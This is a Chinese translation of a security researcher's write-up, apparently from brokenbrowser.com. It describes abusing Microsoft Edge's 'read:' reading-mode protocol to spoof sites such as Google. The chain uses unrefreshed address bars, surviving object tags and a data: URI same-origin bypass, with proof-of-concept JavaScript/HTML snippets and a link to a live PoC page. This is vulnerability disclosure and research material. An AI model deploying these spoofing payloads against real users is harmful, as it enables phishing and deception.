
# 【技术分享】基于Edge浏览器阅读模式的伪装术 （含演示视频）


                                阅读量   
                                **94519**
                            
                        |
                        
                                                                                                                                    ![](./img/85914/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：brokenbrowser.com
                                <br>原文地址：[https://www.brokenbrowser.com/sop-bypass-abusing-read-protocol/ ](https://www.brokenbrowser.com/sop-bypass-abusing-read-protocol/%20)

译文仅供参考，具体内容表达以及含义原文为准

[![](./img/85914/t0117deb4a3a3bcd758.jpg)](./img/85914/t0117deb4a3a3bcd758.jpg)



翻译：[shan66](http://bobao.360.cn/member/contribute?uid=2794169747)

预估稿费：200RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

<br>

**前言**

近期，微软公司的Edge浏览器团队开始在tweet上面大肆宣扬阅读模式，说这个功能可以消除网页的混乱，以免让人分心。我对这些东西并不陌生，因为我了解各种伪协议在Edge浏览器中的运行机制，不过之前我还从来没有用过它，直到最近关于它的讨论在tweet上面炸了锅。如果您是急性子，可以直接观看PoC视频，否则的话，可以耐着性子阅读本文。

要想体验一把阅读模式的话，可以加载网站，然后点击阅读视图按钮（即书状图标）。 

[![](./img/85914/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0107215f363b47bd43.png)

这样的话，网页看起来会更清爽一些。

[![](./img/85914/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01199f7cc9f66e2301.png)

但是，该网页的这个decaf版本的真正地址是什么呢？ 打开开发工具（F12）并在控制台中键入location.href：很明显，Edge浏览器正在URL前边添加了伪协议read：。 

[![](./img/85914/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0128123c0fdaff0b11.png)

以下漏洞适用于所有Edge浏览器版本，但这里的PoC本身是针对Edge 15构建的。要想在旧版本上执行这个POC的话，必须进行相应的修改，以确保以阅读模式呈现它。

<br>

**阅读模式是一种内部资源**

阅读模式网页与真实网站无关。 如果我们查看源码（按CTRL U）的话，我们将找不到原始页面的任何踪迹，实际上它是一个托管在文件系统中的内部资源： 

```
C:WindowsSystemAppsMicrosoft.MicrosoftEdge_8wekyb3d8bbweAssetsReadingView
```

Edge浏览器会解析原始网页的内容，删除iframe / scripts及其他html标签，最后将其呈现在内部阅读视图html中托管的iframe中。但所有这些都是在幕后进行的，用户对这些不得而知，通常会误以为还在原始网站上，因为地址栏并没有改变。

但是，如果Edge浏览器通过在真实URL之前设置“read：”协议，在阅读模式下呈现网页的话，我们还可以利用脚本搞些小动作吗？ 我们可以自动在阅读模式下加载任何网址吗？

<br>

**强制任意网站进入阅读模式**

我们来看看是否可以通过前置read：协议来迫使任意的URL使用读取模式进行呈现。 

```
location.href = "read:http://www.cracking.com.ar"; // prepending read: does the trick
```

这种做法的效果非常好，但是仍然有某些东西会引起人们的注意：虽然地址栏中的URL是crack.com.ar，但是渲染的内容来自brokenbrowser.com。这是什么情况呢？ 那么，如果我们检测crack.com.ar的话，我们会看到有一个location.replace指向brokenbrowser.com，但Edge浏览器并没有更新地址栏！ 

**漏洞＃1：在阅读模式下，当脚本/ http重定向发生时，Edge浏览器并不会更新地址栏。 **

[![](./img/85914/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01ef153837f47d3a90.png)

<br>

**寻找我们感兴趣的重定向**

这意味着我们可以利用重定向伪装成任意网站，甚至可以控制所有重定向到位于我们掌控之下的网站的那些网站。 例如，如果我们可以使google.com重定向到一个恶意的页面，那么用户将会认为内容来自谷歌，实际上它是来自evil.com。

顺便说一下，考虑到所有的自然排序结果(Organic Results)都是重定向到目标网站的链接，所以伪装成谷歌并不是什么难事。 例如，谷歌已经从crack.com.ar索引了一个页面“crack-01.html”，如果我们发现重定向到该页面的自然排序结果链接的话，那么我们就胜券在握了，因为它位于我们自己的服务器中，我可以任意修改它！对吗？ 不妨让我们打开Chrome，找到一个指向我们的服务器（crack.com.ar）的谷歌重定向。 请记住：我们的目标是找到一个重定向至crack.com.ar的Google网址，而该网站正好处于我们的掌控之中。 

[![](./img/85914/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0152c3f6af3e256c8e.png)

<br>

**在阅读模式下重定向**

现在，我们有一个重定向到crack.com.ar的google.com.ar URL了。然后，我们可以在crack.com.ar中的网页中放上一些文字，例如“它并非真正的Google网站”，这样的话，我们就可以很容易地确定内容的真正来源了。 以下是前置了read: 伪协议的Google重定向，在Edge浏览器中打开时的情形如下所示： 

```
read:https://www.google.com.ar/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=1&amp;cad=rja&amp;uact=8&amp;ved=0ahUKEwiRx_eksaTTAhURl5AKHcrxCuoQFgggMAA&amp;url=http%3A%2F%2Fwww.cracking.com.ar%2Fcracking-01.html&amp;usg=AFQjCNGa3PACMDlI6RdBOnoEfySVh1C2ZQ
```

[![](./img/85914/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01906d13faca096ee0.png)

哇！多么漂亮的一次伪装啊，但是别忘了，我们正在使用阅读模式！这意味着我们无法完全控制页面的外观。记住：在渲染我们的页面之前，Edge浏览器会剥离大量的HTML内容。例如，iframe和脚本都会被删除，并且JavaScript链接也不起作用。那么，我们该如何自定义这个页面并摆脱那个淡黄色的背景呢？我们怎样才能在这里运行脚本呢？

<br>

**在阅读模式下运行脚本**

当我们处于阅读模式时，Edge浏览器会尽力保持内容静态化，这意味着不允许任何脚本、iframe将被丢弃等。换句话说，我们的内容最终看起来更像是一本书，而不是一个网页。但是，我们将设法打破这种看上去一切已被冻结的静态阅读模式所带来的各种障碍。

为此，我手动测试了几个html标签，如iframe / script / meta，但是它们都会被删除。然后，我尝试了一下object/html标签，令我惊讶的是，它竟然是行得通的！事情比我们想象的要更容易，object/html标签几乎可以精确模拟iframes：它们可是能够运行脚本的html容器啊！ 

**漏洞＃2：当在阅读模式下呈现页面时，微软的Edge浏览器并不会删除对象标签。**

所以，如果我们在crack.com.ar中的页面中添加一个对象标签，然后触发一个提示的话，那么它看起来就很有说服力了。 



```
&lt;!-- prompt.html does a window.prompt with the hard coded "google.com needs..." message --&gt;
&lt;object data="http://www.cracking.com.ar/prompt.html"&gt;&lt;/object&gt;
```

[![](./img/85914/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t010b3b5c1775cf5d09.png)

现在，Edge浏览器会认为首页源自google.com.ar（事实上，它是源自crack.com.ar），object/html源自crack.com.ar（确实如此）。但问题是，虽然我们可以抛出提示/警报，但是我们仍然无法访问首页。

假设我们要将首页的背景颜色更改为白色，或者写一些东西来使攻击更具迷惑性的话，我们将需要绕过同源策略或设置顶级URL，而不更改地址栏。下面，我们来尝试前一种方法：绕过SOP。

跳出&lt;object&gt;之外进行思考

我们如何代表顶级域来呈现任意的html代码，以便可以真正访问它呢？ 其实，data uri 是个不错的选择。 我们可以在data uri中呈现html，而不是渲染托管在crack.com.ar中的内容，就像这样： 



```
&lt;!-- object rendering a data uri --&gt;
&lt;object data="data:,&lt;script&gt;alert(top.location)&lt;/script&gt;"&gt;&lt;/object&gt;
&lt;!-- ACCESS DENIED data uris have their own unique origin --&gt;
```

别急，事情没那么简单。实际上，Edge浏览器不允许从这个data uri访问任何其他文档。所有浏览器都将data uris作为不同于其创建者的特殊源来处理，但在Edge浏览器上，这个限制很容易绕过：页面加载后，单凭self-document.write就足以将我们的源设置成与我们的父源相匹配。

**漏洞＃3：在data: uris中，可以通过document.write设置源，使其与其父源/创建者相匹配。 **



```
&lt;object data="data:,&lt;script&gt;
window.onload = function()
{ // Executing a document.write in a data uri after the onload
  // changes the location of the object to its parent URL.
  document.write('&lt;script&gt;alert(top.location.href)&lt;/script&gt;');
  document.close();
}
&lt;/script&gt;"&gt;&lt;/object&gt;
&lt;!-- Now we have the same location as our top --&gt;
```

[![](./img/85914/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01a7d54aa7b7bd9dec.png)

是的，伙计们！我们现在正在访问Google的顶级域名。这样的话，我们就可以完全访问渲染阅读模式的内部html代码了，而不用改变任何东西，这样就可以通过top.document.write替换淡黄色的背景了。 



```
&lt;object data="data:,&lt;script&gt;
window.onload = function()
{
  document.write(
    '&lt;script&gt;'+
        'top.document.write('Trust me, we are on Google =)');'+
        'top.document.close()'+
    '&lt;/script&gt;');
  document.close();
}
&lt;/script&gt;"&gt;&lt;/object&gt;
```

[![](./img/85914/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t013a8cadd7e2f381c2.png)

[**[ PoC测试页面]**](https://www.cracking.com.ar/demos/edgeread/)



**演示视频**



如果您不喜欢在线进行的话，可以从[**这里**](https://goo.gl/gQ8vAb)下载相应的文件。 
